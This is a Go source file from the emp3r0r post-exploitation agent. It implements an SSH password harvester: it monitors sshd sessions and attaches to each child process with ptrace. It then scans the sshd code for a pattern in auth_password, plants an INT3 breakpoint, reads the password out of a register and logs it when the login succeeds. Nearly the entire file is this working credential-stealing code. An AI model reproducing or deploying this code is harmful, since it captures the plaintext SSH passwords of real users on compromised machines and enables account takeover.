//go:build linux && amd64
// +build linux,amd64

package agent

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"golang.org/x/sys/unix"
)

var (
	traced_pids     = make(map[int]bool)
	traced_pids_mut = &sync.RWMutex{}
)

func sshd_monitor(logStream chan string, code_pattern []byte, reg_name string) (err error) {
	alive, sshd_procs := util.IsProcAlive("sshd")
	if !alive {
		util.LogStreamPrintf(logStream, "sshd_monitor (%d): sshd process not found, aborting", unix.Getpid())
		return
	}

	util.LogStreamPrintf(logStream, "sshd_monitor started (%d)", unix.Getpid())
	monitor := func(sshd_pid int) {
		util.LogStreamPrintf(logStream, "Started monitor (%d) on SSHD (%d)", unix.Getpid(), sshd_pid)
		for {
			util.TakeABlink()
			children_file := fmt.Sprintf("/proc/%d/task/%d/children", sshd_pid, sshd_pid)
			children_data, err := os.ReadFile(children_file)
			if err != nil {
				return
			}
			children_pids := strings.Fields(string(children_data))
			for _, child := range children_pids {
				child_pid, err := strconv.Atoi(child)
				if err == nil {
					traced_pids_mut.RLock()
					if !traced_pids[child_pid] {
						go sshd_harvester(child_pid, logStream, code_pattern, reg_name)
					}
					traced_pids_mut.RUnlock()
				}
			}
		}
	}
	for _, sshd_proc := range sshd_procs {
		util.LogStreamPrintf(logStream, "Starting monitor (%d) on SSHD (%d)", unix.Getpid(), sshd_proc.Pid)
		go monitor(int(sshd_proc.Pid))
	}

	for {
		util.TakeASnap()
	}
}

func sshd_harvester(pid int, logStream chan string, code_pattern []byte, reg_name string) {
	// remember pid
	traced_pids_mut.Lock()
	traced_pids[pid] = true
	traced_pids_mut.Unlock()

	if code_pattern == nil {
		code_pattern = []byte{0x48, 0x83, 0xc4, 0x08, 0x0f, 0xb6, 0xc0, 0x21}
	}
	// code_pattern_littleendian := []byte{0x21, 0xc0, 0xb6, 0x0f, 0x08, 0xc4, 0x83, 0x48}
	util.LogStreamPrintf(logStream, "\n[+] Starting Harvester for SSHD session %d", pid)
	map_file := fmt.Sprintf("/proc/%d/maps", pid)
	map_data, err := os.ReadFile(map_file)
	if err != nil {
		util.LogStreamPrintf(logStream, "Failed to read memory map of %d: %v", pid, err)
		return
	}
	// parse memory map
	lines := strings.Split(string(map_data), "\n")
	var (
		ptr  uint64 // start of sshd process, start of code pattern
		pend uint64 // end of sshd process
	)
	for _, line := range lines {
		if strings.Contains(line, "/sshd") &&
			strings.Contains(line, "r-x") {
			f1 := strings.Fields(line)[0]
			if len(f1) < 2 {
				util.LogStreamPrintf(logStream, "error parsing line: %s", line)
				continue
			}
			start := strings.Split(f1, "-")[0]
			end := strings.Split(f1, "-")[1]
			ptr, err = strconv.ParseUint(start, 16, 64)
			if err != nil {
				util.LogStreamPrintf(logStream, "parsing pstart: %v", err)
				return
			}
			pend, err = strconv.ParseUint(end, 16, 64)
			if err != nil {
				util.LogStreamPrintf(logStream, "parsing pend: %v", err)
				return
			}
		}
	}
	util.LogStreamPrintf(logStream, "Harvester PID is %d", unix.Getpid())
	util.LogStreamPrintf(logStream, "SSHD process found in 0x%x - 0x%x", ptr, pend)
	pstart := ptr

	// #13 https://github.com/jm33-m0/emp3r0r/issues/13
	// fixes "no such process" error
	// this makes sure we don't lose our tracee
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	err = unix.PtraceAttach(pid)
	if err != nil {
		util.LogStreamPrintf(logStream, "failed to attach to %d: %v", pid, err)
		return
	}
	defer unix.PtraceDetach(pid)
	// wait for the process to stop
	wstatus := new(unix.WaitStatus)
	_, err = unix.Wait4(pid, wstatus, 0, nil)
	if err != nil {
		util.LogStreamPrintf(logStream, "wait %d: %v", pid, err)
		return
	}
	switch {
	case wstatus.Exited():
		util.LogStreamPrintf(logStream, "SSHD %d exited...", pid)
		return
	case wstatus.CoreDump():
		util.LogStreamPrintf(logStream, "SSHD %d core dumped...", pid)
	case wstatus.Continued():
		util.LogStreamPrintf(logStream, "SSHD %d continues...", pid)
	case wstatus.Stopped():
		util.LogStreamPrintf(logStream, "SSHD %d has stopped on attach...", pid)
	}
	word := make([]byte, 8)
	util.LogStreamPrintf(logStream, "We (%d) are now tracing sshd session (%d)", unix.Getpid(), pid)

	// search for auth_password
	util.LogStreamPrintf(logStream, "Searching for auth_password")
	for ptr < pend {
		_, err := unix.PtracePeekText(pid, uintptr(ptr), word)
		if err != nil {
			util.LogStreamPrintf(logStream, "PTRACE_PEEKTEXT searching memory of %d: %v",
				pid, err)
			time.Sleep(time.Second)
		}
		if bytes.Equal(word, code_pattern) {
			util.LogStreamPrintf(logStream, "Got a hit (0x%x) at 0x%x", word, ptr)
			// now pstart is the start of our code pattern
			break
		}
		ptr++
	}
	if ptr == pend {
		util.LogStreamPrintf(logStream, "code pattern 0x%x not found in memory 0x%x to 0x%x",
			code_pattern, pstart, pend)
		return
	}

	// points to the start of our code pattern
	pcode_pattern := uintptr(ptr)
	// dump code at code pattern
	util.LogStreamPrintf(logStream, "Code pattern found at 0x%x", pcode_pattern)
	dump_code(pid, pcode_pattern, logStream)

	// before breakpoint, what does the code look like
	util.LogStreamPrintf(logStream, "Before setting the breakpoint, what does the code look like?")
	regs := dump_regs(pid, logStream)
	if regs != nil {
		dump_code(pid, uintptr(regs.Rip), logStream)
	}

	// write breakpoint
	code_with_trap := make([]byte, 8)
	copy(code_with_trap, code_pattern)
	code_with_trap[0] = 0xCC
	// code_with_trap[len(code_with_trap)-1] = 0xCC
	util.LogStreamPrintf(logStream, "Patching code 0x%x to 0x%x", code_pattern, code_with_trap)
	_, err = unix.PtracePokeText(pid, pcode_pattern, code_with_trap)
	if err != nil {
		util.LogStreamPrintf(logStream, "patching code: %v", err)
		return
	}
	util.LogStreamPrintf(logStream, "INT3 written, breakpoint set")
	util.LogStreamPrintf(logStream, "Dumping code at code pattern 0x%x to check if bp has been set", pcode_pattern)
	dump_code(pid, pcode_pattern, logStream)
	util.LogStreamPrintf(logStream, "Resuming process to let it hit breakpoint")
	err = unix.PtraceCont(pid, int(unix.SIGCONT))
	if err != nil {
		util.LogStreamPrintf(logStream, "resuming process: %v", err)
		return
	}
	_, err = unix.Wait4(pid, wstatus, 0, nil)
	if err != nil {
		util.LogStreamPrintf(logStream, "wait %d to hit breakpoint: %v", pid, err)
		return
	}
	switch {
	case wstatus.Exited():
		util.LogStreamPrintf(logStream, "SSHD %d exited...", pid)
		return
	case wstatus.CoreDump():
		util.LogStreamPrintf(logStream, "SSHD %d core dumped...", pid)
		return
	case wstatus.Continued():
		util.LogStreamPrintf(logStream, "SSHD %d continues...", pid)
	case wstatus.Stopped():
		util.LogStreamPrintf(logStream, "SSHD %d has hit breakpoint", pid)
	}

handler:
	success := false
	// read registers on break
	regs = new(unix.PtraceRegs)
	err = unix.PtraceGetRegs(pid, regs)
	if err != nil {
		util.LogStreamPrintf(logStream, "get regs: %v", err)
		return
	}
	pam_ret := regs.Rax
	// where are we at
	util.LogStreamPrintf(logStream, "Dumping code at RIP after hitting breakpoint")
	dump_code(pid, uintptr(regs.Rip), logStream)

	// read password from given register name
	password_bytes := read_reg_val(pid, reg_name, logStream)
	util.LogStreamPrintf(logStream, "Extracting password from %s", reg_name)
	password := string(password_bytes)
	if pam_ret == 0 {
		util.LogStreamPrintf(logStream, "RAX=0x%x, password 0x%x (%s) is invalid", pam_ret, password, password)
	} else {
		success = true
		util.LogStreamPrintf(logStream, "\n\nWe have password 0x%x (%s)\n\n", password, password)
	}
	// remove breakpoint
	util.LogStreamPrintf(logStream, "Removing breakpoint")
	_, err = unix.PtracePokeText(pid, pcode_pattern, code_pattern)
	if err != nil {
		util.LogStreamPrintf(logStream, "restoring code to remove breakpoint: %v", err)
		return
	}
	// one byte back, go back before 0xCC, at the start of code pattern
	regs.Rip--
	err = unix.PtraceSetRegs(pid, regs)
	if err != nil {
		util.LogStreamPrintf(logStream, "set regs back: %v", err)
		return
	}
	regs = dump_regs(pid, logStream)
	dump_code(pid, uintptr(regs.Rip), logStream)
	// single step to execute original code
	err = unix.PtraceSingleStep(pid)
	if err != nil {
		util.LogStreamPrintf(logStream, "single step: %v", err)
		return
	}
	_, err = unix.Wait4(pid, wstatus, 0, nil)
	if err != nil {
		util.LogStreamPrintf(logStream, "wait %d to single step: %v", pid, err)
		return
	}
	util.LogStreamPrintf(logStream, "Single step done")

	// check if breakpoint is removed
	util.LogStreamPrintf(logStream, "Dumping code at code pattern 0x%x to check if bp has been removed", pcode_pattern)
	dump_code(pid, pcode_pattern, logStream)
	util.LogStreamPrintf(logStream, "Breakpoint should now be removed: 0x%x, sshd will proceed", word)

	// add breakpoint back
	_, err = unix.PtracePokeText(pid, pcode_pattern, code_with_trap)
	if err != nil {
		util.LogStreamPrintf(logStream, "patching code: %v", err)
		return
	}
	util.LogStreamPrintf(logStream, "Added breakpoint back")

	// continue sshd session process
	err = unix.PtraceCont(pid, int(unix.SIGCONT))
	if err != nil {
		util.LogStreamPrintf(logStream, "continue SSHD session: %v", err)
		return
	}
	_, err = unix.Wait4(pid, wstatus, 0, nil)
	if err != nil {
		util.LogStreamPrintf(logStream, "wait %d to continue: %v", pid, err)
		return
	}
	switch {
	case wstatus.Stopped():
		if !success {
			goto handler
		}
	case wstatus.Exited():
		util.LogStreamPrintf(logStream, "SSHD %d exited...", pid)
	case wstatus.CoreDump():
		util.LogStreamPrintf(logStream, "SSHD %d core dumped...", pid)
	case wstatus.Continued():
		util.LogStreamPrintf(logStream, "SSHD %d core continues...", pid)
	default:
		util.LogStreamPrintf(logStream, "uncaught exit status of %d: %d", pid, wstatus.ExitStatus())
	}
}

func dump_regs(pid int, log_stream chan string) (regs *unix.PtraceRegs) {
	// dump reg values
	rax := read_reg_val(pid, "RAX", log_stream)
	rdi := read_reg_val(pid, "RDI", log_stream)
	rsi := read_reg_val(pid, "RSI", log_stream)
	rdx := read_reg_val(pid, "RDX", log_stream)
	rcx := read_reg_val(pid, "RCX", log_stream)
	r8 := read_reg_val(pid, "R8", log_stream)
	r9 := read_reg_val(pid, "R9", log_stream)
	rbp := read_reg_val(pid, "RBP", log_stream)
	rsp := read_reg_val(pid, "RSP", log_stream)
	util.LogStreamPrintf(log_stream, "RAX=%s, RDI=%s, RSI=%s, RDX=%s, RCX=%s, R8=%s, R9=%s, RBP=%s, RSP=%s", rax, rdi, rsi, rdx, rcx, r8, r9, rbp, rsp)

	return
}

// read register value, return printable text or hex string
func read_reg_val(pid int, reg_name string, log_stream chan string) (val []byte) {
	regs := new(unix.PtraceRegs)
	err := unix.PtraceGetRegs(pid, regs)
	if err != nil {
		util.LogStreamPrintf(log_stream, "dump code for %d failed: %v", pid, err)
		return
	}
	switch reg_name {
	case "RAX":
		val = peek_text(pid, uintptr(regs.Rax), log_stream)
	case "RDI":
		val = peek_text(pid, uintptr(regs.Rdi), log_stream)
	case "RSI":
		val = peek_text(pid, uintptr(regs.Rsi), log_stream)
	case "RDX":
		val = peek_text(pid, uintptr(regs.Rdx), log_stream)
	case "RCX":
		val = peek_text(pid, uintptr(regs.Rcx), log_stream)
	case "R8":
		val = peek_text(pid, uintptr(regs.R8), log_stream)
	case "R9":
		val = peek_text(pid, uintptr(regs.R9), log_stream)
	case "RBP":
		val = peek_text(pid, uintptr(regs.Rbp), log_stream)
	case "RSP":
		val = peek_text(pid, uintptr(regs.Rsp), log_stream)
	}
	return
}

// read memory at addr and check if it's printable, 24 bytes at most
func peek_text(pid int, addr uintptr, log_stream chan string) (read_bytes []byte) {
	if addr == 0 {
		util.LogStreamPrintf(log_stream, "Invalid address 0x%x", addr)
		return
	}
	read_bytes = make([]byte, 24)
	_, err := unix.PtracePeekText(pid, addr, read_bytes)
	if err != nil {
		util.LogStreamPrintf(log_stream, "PEEKTEXT: %v", err)
		return
	}
	if util.AreBytesPrintable(read_bytes) {
		return
	}
	res_str := hex.EncodeToString(read_bytes)
	return []byte(res_str)
}

func dump_code(pid int, addr uintptr, log_stream chan string) {
	code_bytes := peek_text(pid, addr, log_stream)
	if len(code_bytes) == 0 {
		return
	}
	util.LogStreamPrintf(log_stream, "Code at 0x%x: %x", addr, code_bytes)
}

func get_tracer_pid(pid int, log_stream chan string) (tracer_pid int) {
	// check tracer pid
	proc_status, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
	if err != nil {
		util.LogStreamPrintf(log_stream, "get_tracer: %v", err)
		return
	}
	lines := strings.Split(string(proc_status), "\n")
	for _, line := range lines {
		if strings.HasPrefix(line, "TracerPid:") {
			tracer := strings.Fields(line)[1]
			tracer_pid, err = strconv.Atoi(tracer)
			if err != nil {
				util.LogStreamPrintf(log_stream, "Invalid tracer PID: %v", err)
				return
			}
			break
		}
	}

	return
}
